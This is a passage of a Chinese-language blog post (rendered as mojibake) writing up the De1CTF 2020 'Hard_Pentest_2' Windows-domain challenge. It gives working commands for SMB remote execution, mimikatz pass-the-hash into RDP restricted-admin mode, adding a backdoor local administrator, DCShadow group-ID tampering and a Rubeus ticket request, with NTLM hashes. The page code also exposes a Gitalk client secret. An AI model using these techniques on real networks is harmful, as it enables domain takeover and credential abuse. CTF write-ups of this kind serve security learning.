<p>ç„¶ååœ¨æˆ‘çš„è™šæ‹Ÿæœº/etc/hosts æ·»åŠ äº† 192.168.0.12 dm ,ç„¶è€Œå¹¶æ²¡æœ‰è§£å†³é—®é¢˜ï¼Œä¹‹åå°±å¼€å§‹æœç´¢proxychains dnsè§£æçš„ä¸œè¥¿ï¼Œæ˜¯proxyresolvï¼Œå¼€å§‹å®ƒæ˜¯è¿™æ ·çš„</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509193855651.png" alt="image-20200509193855651"></p>
<p>çœ‹ä¸Šé¢ä¹‹æ‰€ä»¥å¤±è´¥å°±æ˜¯è¿™é‡Œçš„4.2.2.2ä¸èƒ½è§£ædm,ç„¶åæˆ‘ä»¬éœ€è¦è§£ædmä¸º192.168.0.12ï¼Œè¿™é‡Œå›¾ç®€å•ç„¶åå°±æ— è„‘åœ°è®©ç¨‹åºè¾“å‡º192.168.0.12å°±å¯ä»¥äº†ï¼Œï¼Œï¼Œï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509194940263.png" alt="image-20200509194940263"></p>
<p>ç„¶åè¿˜æ˜¯ä¹‹å‰çš„ä¸€å¥—æµç¨‹ï¼Œç”¨wmiexec.pyè¿˜æ˜¯ä¸æˆåŠŸï¼Œç„¶åè¯•äº†è¯•smbexec.pyï¼Œç„¶åå°±å¯ä»¥äº†ï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509195542165.png" alt="image-20200509195542165"></p>
<p>ä¹‹åé€€å‡ºè¿‡ä¸€å›ï¼Œåœ¨ç”¨smbexec.pyå°±æŠ¥é”™äº†ï¼Œä»€ä¹ˆæœåŠ¡å·²å­˜åœ¨ï¼Œç„¶åå°±åªèƒ½ç”¨acexec.pyæ¥æ‰§è¡Œå•æ¡å‘½ä»¤äº†ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªåé—¨æ‰§è¡Œååœ¨cså¾—åˆ°ä¸€ä¸ªsystemæƒé™çš„shellã€‚</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509200703281.png" alt="image-20200509200703281"></p>
<p>è¿›è¡ŒDCShadowæ”»å‡»éœ€è¦æ‰“å¼€ä¸¤ä¸ªmimikatzçª—å£ï¼Œç„¶åå¼€å¯è¿œç¨‹æ¡Œé¢ï¼ˆä¹Ÿå¯ä»¥ä¸å¼€è¿œç¨‹æ¡Œé¢ï¼Œå¯ä»¥å‚è€ƒå‡ºé¢˜äºº<a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">åšå®¢</a>ï¼‰ï¼Œè¿™é‡Œåˆ©ç”¨<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>è¿›è¡Œä»£ç†ï¼Œfrpä½¿ç”¨è¯·çœ‹å¦ä¸€ç¯‡æ–‡ç« ï¼Œä»£ç†è®¾ç½®å¥½ä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ç¯‡æ–‡ç« æåˆ°çš„<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>åˆ©ç”¨ntlmç›´æ¥ç™»å½•è¿œç¨‹æ¡Œé¢</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:DM &#x2F;ntlm:cf3c7280c8c3d3fcce24e9e7289ddd10 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/09/De1ctf-pentest2/image-20200506151539110.png" alt="image-20200506151539110"></p>
<blockquote>
<p>Restricted Admin modeï¼Œç›´è¯‘ä¸ºå—é™ç®¡ç†æ¨¡å¼ï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä½¿å¾—å‡­æ®ä¸ä¼šæš´éœ²åœ¨ç›®æ ‡ç³»ç»Ÿä¸­</p>
<h3 id="é€‚ç”¨ç³»ç»Ÿ"><a href="#é€‚ç”¨ç³»ç»Ÿ" class="headerlink" title="é€‚ç”¨ç³»ç»Ÿ"></a>é€‚ç”¨ç³»ç»Ÿ</h3><ul>
<li>Windows 8.1å’ŒWindows Server 2012 R2é»˜è®¤æ”¯æŒè¯¥åŠŸèƒ½</li>
<li>Windows 7å’ŒWindows Server 2008 R2é»˜è®¤ä¸æ”¯æŒï¼Œéœ€è¦å®‰è£…è¡¥ä¸2871997ã€2973351</li>
</ul>
</blockquote>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509201856781.png" alt="image-20200509201856781"></p>
<p>è¿œç¨‹æ¡Œé¢æ‰“ä¸å¼€ï¼Œç„¶åæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add #æ·»åŠ ç”¨æˆ·</span><br><span class="line">net user 123 123 /add</span><br><span class="line">net user username #æŸ¥çœ‹ç”¨æˆ·çš„è¯¦æƒ…</span><br><span class="line">net user 123</span><br><span class="line">net localgroup group username /add #å°†ç”¨æˆ·æ·»åŠ åˆ°groupä¸­</span><br><span class="line">net localgroup administrators 123 /add</span><br></pre></td></tr></table></figure>

<p>ç„¶åmstsc.exeï¼Œç›´æ¥è¾“å…¥è´¦å·å¯†ç è¿æ¥ï¼Œç¬¬ä¸€æ¬¡æ‹¿åˆ°åˆ«äººçš„è¿œç¨‹æ¡Œé¢ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509203945376.png" alt="image-20200509203945376"></p>
<p>ç„¶åå°±æ˜¯DCShadowï¼Œä»¥ç®¡ç†å‘˜æ‰“å¼€ä¸€ä¸ªmimikatz.exeï¼Œç„¶åè¾“å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processtoken</span><br><span class="line">lsadump::dcshadow &#x2F;object:CN&#x3D;De1ta,CN&#x3D;Users,DC&#x3D;De1CTF2020,DC&#x3D;lab &#x2F;attribute:primaryGroupID &#x2F;value:512</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨ä»¥de1taç”¨æˆ·çš„èº«ä»½ï¼Œpushæ¨é€ï¼Œè¯•äº†åŠå¤©å°±æ˜¯æ²¡æˆåŠŸã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt &#x2F;user:de1ta &#x2F;rc4:B03094996601324646AC223BF30D0D07 &#x2F;domain:de1ctf2020.lab &#x2F;ptt &amp;&amp; mimikatz.exe &quot;lsadump::dcshadow &#x2F;push&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨Coblt Strikeä¸­ä¹Ÿæ²¡æˆåŠŸï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ</p>
<p>æŠ¥é”™å¦‚ä¸‹</p>
<p><img src="/2020/05/09/De1ctf-pentest2/image-20200509225941467.png" alt="image-20200509225941467"></p>
<p>æŸ¥äº†æŠ¥é”™ä¹Ÿéƒ½æ˜¯è¯´æ˜¯å› ä¸ºç¬¬ä¸€æ­¥æ²¡æœ‰ç”¨systemæƒé™æ‰“å¼€mimikatz,exeï¼Œæ˜¯ç”¨systemæ‰“å¼€çš„å•Šã€‚ğŸ˜µğŸ˜µğŸ˜µ</p>
<p>å‚è€ƒ</p>
<p><a href="https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1CR0up_b5a1zw02wZNwJpg</a></p>
<p><a href="https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest" target="_blank" rel="noopener">https://byqiyou.github.io/2020/05/06/De1CTF2020/#Hard-Pentest</a></p>
<p>[<a href="https://xz.aliyun.com/t/7454]" target="_blank" rel="noopener">https://xz.aliyun.com/t/7454]</a>(</p>

      
    </div>
  </div>
  <!-- è¦æ·»åŠ çš„å†…å®¹ -->
  
    <div>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>ä½œè€…:  </strong>Mount4in</a>
          </li>
          <li class="post-copyright-link">
          <strong>æ–‡ç« é“¾æ¥:  </strong>
          <a href="/2020/05/09/De1ctf-pentest2/" target="_blank" title="De1ctf Hard_Pentest_2">http://mount4in.github.io/2020/05/09/De1ctf-pentest2/</a>
          </li>
          <li class="post-copyright-license">
            <strong>ç‰ˆæƒå£°æ˜:   </strong>
            æœ¬ç½‘ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–,å‡é‡‡ç”¨ <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„!
          </li>
        </ul>
      <div>

  
  <!---->
    <footer class="article-footer">
      <a data-url="http://mount4in.github.io/2020/05/09/De1ctf-pentest2/" data-id="clg20p62s002r14uv9p796ecz"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/" rel="tag">pentest</a></li></ul>

    </footer>



  
    
  <nav class="article-nav">
    
      <a href="/2020/05/10/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AFwriteup/" class="article-nav-link">
        <strong class="article-nav-caption">Newer</strong>
        <div class="article-nav-title">
          
            2020å¹´ç½‘é¼æ¯WEB-writeup
          
        </div>
      </a>
    
    
      <a href="/2020/05/05/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="article-nav-link">
        <strong class="article-nav-caption">Older</strong>
        <div class="article-nav-title">æ¸—é€å·¥å…·ä½¿ç”¨</div>
      </a>
    
  </nav>


  


  
    
  <div class="gitalk" id="gitalk-container"></div>
  
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">

  
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

  
<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>

  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: 'b7d32ae2538e1a71f462',
      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
      repo: 'gitalk',
      owner: 'Mount4in',
      admin: ['Mount4in'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2023 Mount4in</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>
<aside class="sidebar">
  <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="Search">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
</aside>

<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


  
<script src="/fancybox/jquery.fancybox.min.js"></script>




  
<script src="/js/tocbot.min.js"></script>

  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>



<script src="/js/ocean.js"></script>


</body>
</html>